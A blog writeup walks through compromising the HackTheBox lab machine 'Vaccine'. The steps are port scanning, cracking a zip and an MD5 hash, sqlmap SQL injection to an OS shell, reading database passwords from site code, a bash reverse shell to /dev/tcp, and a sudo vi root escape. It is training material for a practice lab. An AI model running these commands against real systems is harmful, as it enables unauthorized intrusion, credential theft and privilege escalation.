---
title: "HTB: Vaccine"
description: "HackTheBox Starting Point writeup"
date: 2020-11-14
categories: 'Hack The Box'
image:
 path: /images/htbsp/vaccine/head.png
 caption: "Hustle never stops"
---

Hello, everybody! I hope you're all safe and sound out there! Today's room is the third room in the [HackTheBox]() Starting Point series and was extremely fun for me. It is undoubtedly easy - I was able to complete it without searching for what to do at *almost* any step along the way - but it helped me understand that I'm on a good track, for which I am grateful. So, without wasting any more time, let's dive in.

# Port scanning
First things first:
```bash
kali@kali:~$ sudo nmap -sS 10.10.10.46 -oG nmapss.out
Nmap scan report for 10.10.10.46 (10.10.10.46)
Host is up (0.12s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
This reveals that there are 3 open ports abailable: ftp,ssh and http. At our *post-exploitation* stage in the previous room we found out about an `ftpuser/mc@F1l3ZilL4` and we will use these credentials to log in to the server. Real simple. There we see that there is backup.zip archive which (by using the get) command we get to our computer. However, when we try to unzip it, it becomes apparent that it is encrypted with a password!
## Cracking the zip
This was something I had tried a couple of times before so it was over pretty quick. We will use [John The Ripper](). At first we want to get the hash of the password we want to crack and this is easily achievable for John The Ripper with the preinstalled utilities (I'm using kali, but i think that a simple JtR installation also installs all these files). After we have generated the hash it only takes about 1 second for the password to be cracked using the rockyou.txt wordlist. Then we simply unzip the files.
```bash
kali@kali:~$ sudo zip2john backup.zip > hash
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: 2b chk, TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

=============================================

kali@kali:~$ sudo john hash /usr/share/wordlists/rockyou.txt
kali@kali:~$ sudo john --show hash
backup.zip:741852963::backup.zip:style.css, index.php:backup.zip

1 password hash cracked, 0 left
==============================================

kali@kali:~$ unzip backup.zip
Archive:  backup.zip
[backup.zip] index.php password: 
  inflating: index.php               
    inflating: style.css  
```
# Website
One of the first things we learned about the target machine is that it runs an http server (*remember port 80?*), so at this point (*if you haven't done so already*) you can visit the website by typing 10.10.10.46 in your browser. What loads is a login screen for which you need the credentials. That's where index.php comes handy. You always need to work with what you have:
```bash
kali@kali:~$ cat index.php 
<stuff>
if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
	      $_SESSION['login'] = "true";
	        header("Location: dashboard.php");
}
<stuff>
```
We see that there is an admin user for which the password is there,  but it is not usable; that makes us think that it may be a hash!

```bash
kali@kali:~$ echo "2cb42f8734ea607eefed3b70af13bbd3" > hash2
kali@kali:~$ hashid -m hash2
--File 'hash2'--
Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
[+] MD2 
[+] MD5 [Hashcat Mode: 0]
[+] MD4 [Hashcat Mode: 900]
<stuff>
--End of file 'hash2'--

======================================================

# hashcat to the rescue

kali@kali:~$ hashcat -m 0 hash2 /usr/share/wordlists/rockyou.txt 
kali@kali:~$ hashcat --show hash2
2cb42f8734ea607eefed3b70af13bbd3:qwerty789

```
Now that we have the password we can easily log in and see the website.

## SQL Injection
I am **terribly** new to this technique ;that,however, didnt stop me from trying:
```bash

kali@kali:~$ sqlmap http://10.10.10.46/dashboard.php?search=rwa
[13:15:22] [INFO] testing connection to the target URL
got a 302 redirect to 'http://10.10.10.46:80/index.php'. Do you want to follow? [Y/n] n

======================================

kali@kali:~$ sqlmap http://10.10.10.46/dashboard.php?search=rwa --cookie="PHPSESSID=po9gvngkj9sisssn9aahscreqn"
[13:17:06] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
```

# Exploitation and privilege escalation
Googling here and there for a bit I realized that I should give an os-shell a chance ... and it worked.
```bash
kali@kali:~$ sqlmap http://10.10.10.46/dashboard.php?search=rwa --cookie="PHPSESSID=po9gvngkj9sisssn9aahscreqn" --os-shell
```

From there things - as you can understand - become easier!
```bash
# get a more stable shell
SHELL=/bin/bash script -q /dev/null

# find your users password
cat /var/www/html/dashboard.php
try {
   $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");   
    }   
	
# launch a reverse shell, you will need to have opened a nc listener on a port at your virtual machine
bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
```
Let's see what more there is to it... `whoami` reveals the user we are running this command as and in order to see our root permissions the only thing we gotta do is `sudo -l -U postgres` which then gives us a hint on how to proceed ! We can use `sudo vi /etc/postgresql/11/main/pg_hba.conf`! For the vi/vim users out there its easy to think how one can proceed! Press <keyboard>Esc</keyboard> and type in `!/bin/bash`; you have just started a root shell. Check the root.txt file in your forlder to get the flag.

Hope you liked it and found it useful! Subscribe to my RSS feed to stay up to date and if you have feedback, please, contact me through the links in the communications page! 
Have fun!
